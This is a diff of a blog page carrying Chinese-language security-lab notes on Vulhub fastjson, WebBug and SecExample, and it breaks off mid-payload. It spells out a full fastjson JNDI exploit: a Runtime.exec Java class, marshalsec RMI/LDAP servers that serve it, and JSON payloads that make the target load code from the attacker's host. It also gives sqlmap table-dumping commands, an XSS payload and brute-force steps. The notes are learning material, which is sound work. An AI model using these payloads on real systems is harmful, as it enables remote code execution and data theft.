@@ -28,10 +28,128 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/28/SecExample/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-28</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/30/Vulhub/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="fastjson"   >
+          <a href="#fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1>
+      
+        <h2 id="1-2-24"   >
+          <a href="#1-2-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2>
+      <p>在E:\靶场\vulhub-master\fastjson\1.2.24-rce目录下打开终端，运行</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></div></figure>
+
+<p>运行界面图为</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302030232.png" alt="image-20240530203035187"></p>
+<p>运行之后新建一个TouchFile.java文件，写入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success.txt&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>在该java文件夹目录下打开终端，编译这个文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></div></figure>
+
+<p>就能看到该目录下已经有了一个.class文件</p>
+<p>python开启http服务</p>
+<p>终端输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></div></figure>
+
+<p>可以访问一下这个网页看是否开启成功</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8000</span><br><span class="line">//ip地址也可以为本机ip地址</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302023728.png"></p>
+<p>可以看到文件目录下有这么些文件</p>
+<p>借助marshalsec项目开启RMI服务<br>marshalsec:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec" >https://github.com/mbechler/marshalsec</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>下载完marshalsec之后，进到该目录下打开终端运行</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></div></figure>
+
+<p>会生成一个target文件夹，里面又一个marshalsec-0.0.3-SNAPSHOT-all.jar文件说明已经配置成功了</p>
+<p>在target文件夹内打开终端，运行</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://本机ip地址:8000/#TouchFile&quot; </span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302029680.png" alt="image-20240530202944628"></p>
+<p>然后抓包（这个靶场的运行界面的包）发送到Repeater</p>
+<p>修改请求头为POST，添加Content-Type为application/json，添加参数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://本机ip地址:1099/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><code>com.sun.rowset.JdbcRowSetImpl</code> 是 Java 的一部分，属于 <code>javax.sql.rowset</code> 包。这个类实现了 <code>JdbcRowSet</code> 接口，提供了一个封装数据库结果集的 Java Bean 组件。关键的问题是，这个类在处理特定的属性（如 <code>dataSourceName</code>）时，可以触发 Java 的 JNDI服务，这可能会导致远程代码执行</p>
+<p><code>dataSourceName</code> 属性被用于指定 JNDI 查找的地址。在正常情况下，这应该是数据库的位置，但在攻击场景中，这个地址被设置为恶意的 RMI服务器地址</p>
+<p>当 Fastjson 创建 <code>JdbcRowSetImpl</code> 实例并设置其 <code>dataSourceName</code> 时，该实例会尝试连接到提供的 JNDI 地址</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302040219.png" alt="image-20240530204018163"></p>
+<p>发送</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302041342.png" alt="image-20240530204111289"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405310920378.png" alt="image-20240531092032273"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311120287.png" alt="image-20240531112056134"></p>
+<p>查看容器内的文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">//查看容器内内容的id号</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it id号 /bin/bash</span><br><span class="line">//进入该容器</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /tmp</span><br><span class="line">//查看该文件夹下的文件</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302043378.png" alt="image-20240530204334328"></p>
+
+        <h2 id="1-2-47"   >
+          <a href="#1-2-47" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2>
+      <p>方法同1.2.24</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/30/WebBug%E9%9D%B6%E5%9C%BA/">WebBug-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="暴力破解"   >
+          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
+      
+        <h2 id="登录1、3"   >
+          <a href="#登录1、3" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录1、3" class="headerlink" title="登录1、3"></a>登录1、3</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301035256.png" alt="image-20240530103559225"></p>
+<p>随便输入信息登录，抓包，发送到攻击器，选择字典开始攻击</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301036804.png" alt="image-20240530103657752"></p>
+<p>爆破出账号密码</p>
+<p>（登录3可以用sql注入绕过密码）</p>
+
+        <h2 id="登录5-有验证码"   >
+          <a href="#登录5-有验证码" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录5-有验证码" class="headerlink" title="登录5-有验证码"></a>登录5-有验证码</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301105554.png" alt="image-20240530110506521"></p>
+<p>有验证码了，随便输入信息登录，抓包，发送到Repeater</p>
+<p>发包后提示账号或密码错误，修改账号再次发包，发现还是提示账号或密码错误，说明这个验证码是可以重复使用的</p>
+<p>发送到攻击器，选择字典开始攻击</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301104634.png" alt="image-20240530110442577"></p>
+
+        <h1 id="越权"   >
+          <a href="#越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权" class="headerlink" title="越权"></a>越权</h1>
+      <p>DeleteUserServlet.java</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301405684.png" alt="image-20240530140538642"></p>
+<p>必须grade和user_rights都为2才能执行删除操作，而user_rights是在ini.sql文件里就已经定义好的</p>
+
         <h1 id="SQL注入"   >
           <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
-      
+      <p>UsersDao.java文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301341658.png" alt="image-20240530134125613"></p>
+<p>已经添加了预处理语句，防止了SQL注入攻击</p>
+
+        <h1 id="XSS"   >
+          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301119084.png" alt="image-20240530111906053"></p>
+<p>在content里输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>即出现弹窗，并且每次点击留言展示都会有弹窗</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301119582.png" alt="image-20240530111948546"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/28/SecExample/">SecExample-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="SQL注入"   >
+          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300944877.png" alt="image-20240530094448840"></p>
+<p>UserMapper.java代码中使用了 <code>@Mapper</code> 和 <code>@Repository</code> 注解，这通常用于 MyBatis 的 Mapper 接口</p>
+<p>使用了 MyBatis 框架，它通过 XML 配置文件或注解来定义 SQL 查询。这些查询语句可能存在于 MyBatis 的 XML 配置文件中，或者是通过注解方式定义的</p>
+<p>检查 MyBatis 的 XML 配置文件或注解，找到 <code>UserMapper</code> 接口中 <code>listUser</code> 和 <code>listUserByName</code> 方法的具体实现</p>
+<p>在UserMapper.xml中</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300934056.png" alt="image-20240530093431953"></p>
+<p>在 <code>listUserByName</code> 查询中，使用了 <code>$&#123;name&#125;</code> 来拼接 SQL 语句。<code>$&#123;&#125;</code> 是 MyBatis 的一种字符串替换方式，直接将用户输入的值插入到 SQL 查询中，这种方式容易导致 SQL 注入漏洞，如果用户输入了恶意的 SQL 代码，可能会破坏数据库或窃取数据</p>
+<p>为了防止 SQL 注入漏洞，应使用 MyBatis 提供的 <code>#&#123;&#125;</code> 参数化查询方式。这种方式会使用预编译语句，确保用户输入不会直接作为 SQL 代码执行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300954169.png" alt="image-20240530095433112"></p>
+<p>使用sqlmap</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis --tables</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user --columns</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user -C name,id,pwd --dump</span><br></pre></td></tr></table></div></figure>
+
+<p>好像注入出来的信息和本身的界面一样…</p>
+
         <h1 id="RCE"   >
           <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png" alt="image-20240528140353654"></p>
@@ -47,7 +165,9 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 
         <h1 id="spel表达式注入"   >
           <a href="#spel表达式注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#spel表达式注入" class="headerlink" title="spel表达式注入"></a>spel表达式注入</h1>
-      
+      <p>SpEL表达式注入是一种攻击方式，攻击者通过恶意输入在应用程序中执行任意的 SpEL 表达式，从而实现未授权的操作</p>
+<p>SpEL 是 Spring Framework 提供的一种表达式语言，通常用于在 Spring 配置文件、注解和其他地方进行表达式计算</p>
+
         <h1 id="XSS"   >
           <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281517734.png" alt="image-20240528151727685"></p>
@@ -60,7 +180,109 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
           <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281619851.png" alt="image-20240528161919791"></p>
 <p>从请求中获取 <code>User</code> 对象 <code>user1</code> 并设置到类成员变量 <code>user</code> 中，使用 <code>userService.addUser(user)</code> 将用户添加到服务中</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/">pikachu-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-26</span></span></div></header><div class="post-body"><div class="post-excerpt">
+
+        <h1 id="SSRF"   >
+          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290942265.png" alt="image-20240529094223191"></p>
+<p>处理 POST 请求，接受一个 URL 参数，并通过 <code>HttpTool.getHttpReuest</code> 获取该 URL 的内容，然后将结果添加到模型中，返回视图 <code>ssrf/ssrfoutput</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290948049.png" alt="image-20240529094806007"></p>
+<p><code>httpRequest(String requestUrl)</code>：接受一个 URL 参数，打开该 URL 的连接，读取内容并返回</p>
+<p><code>getHttpReuest(String requestUrl)</code>：调用 <code>httpRequest</code> 方法，简化调用流程</p>
+<p>由于应用程序从用户输入获取 URL 并直接在服务器上发起请求，而没有进行任何验证或过滤，所以用户可以通过服务器代理访问任意资源</p>
+
+        <h1 id="CORS"   >
+          <a href="#CORS" class="heading-link"><i class="fas fa-link"></i></a><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291020680.png" alt="image-20240529102023649"></p>
+<p>使用 <code>@CrossOrigin</code> 注解配置跨域访问，允许来自任何域的请求，这是 Spring 的一种声明式配置方式</p>
+<p>将敏感信息添加到模型中，并返回视图名 <code>cors/cors</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291029949.png" alt="image-20240529102922909"></p>
+<p>在响应头中设置 <code>Access-Control-Allow-Origin</code>，允许来自任何域的跨域请求，它允许任意网站读取该资源，将敏感信息添加到模型中，直接设置响应头，这是一个编程式配置方式，需要在每个方法中显式设置响应头</p>
+<p>在模型中添加了敏感信息 <code>info</code>，如果没有适当的访问控制措施，可能导致敏感信息泄露。</p>
+<p>并且这两个都设置了都会返回 <code>Access-Control-Allow-Origin: *</code>，意味着允许任何来源的跨域请求</p>
+
+        <h1 id="Fastjson反序列化"   >
+          <a href="#Fastjson反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h1>
+      
+        <h3 id="代码分析"   >
+          <a href="#代码分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291633945.png" alt="image-20240529163300842"></p>
+<p><code>JSON.parseObject(jsonData)</code>：使用 FastJSON 库解析 JSON 数据</p>
+<p>设置 <code>User</code> 对象的属性 <code>age</code> 和 <code>username</code></p>
+<p>将 <code>User</code> 对象添加到模型中，供视图使用</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291634212.png" alt="image-20240529163444175"></p>
+<p>将 <code>User</code> 对象添加到模型中</p>
+
+        <h3 id="漏洞复现"   >
+          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+      <p>首先修改dockerfile文件第一行为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:8u111-jdk-alpine</span><br></pre></td></tr></table></div></figure>
+
+<p>改之前这个docker的java版本是8u212</p>
+
+        <h6 id="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"   >
+          <a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="headerlink" title="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"></a>JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效</h6>
+      <p>改了之后才能进行攻击</p>
+
+        <h5 id="编译并上传命令执行代码"   >
+          <a href="#编译并上传命令执行代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译并上传命令执行代码" class="headerlink" title="编译并上传命令执行代码"></a>编译并上传命令执行代码</h5>
+      <p>新建一个Touch.java文件，写入</p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Touch</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/Touch&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>然后在该文件目录下打开终端，编译，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Touch.java</span><br></pre></td></tr></table></div></figure>
+
+<p>此时该目录下会生成一个Touch.class文件</p>
+
+        <h5 id="启动http服务"   >
+          <a href="#启动http服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h5>
+      <p>打开终端，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444   //端口号只要不被其他应用占用就行</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="启动LDAP服务器"   >
+          <a href="#启动LDAP服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动LDAP服务器" class="headerlink" title="启动LDAP服务器"></a>启动LDAP服务器</h5>
+      <p>在E:\Github\marshalsec-master\target目录下打开终端，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://主机ip地址:4444/#Touch&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311544536.png" alt="image-20240531154409456"></p>
+
+        <h5 id="发包"   >
+          <a href="#发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#发包" class="headerlink" title="发包"></a>发包</h5>
+      <p>抓包后修改为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: 本机ip:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://本机ip:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 189</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      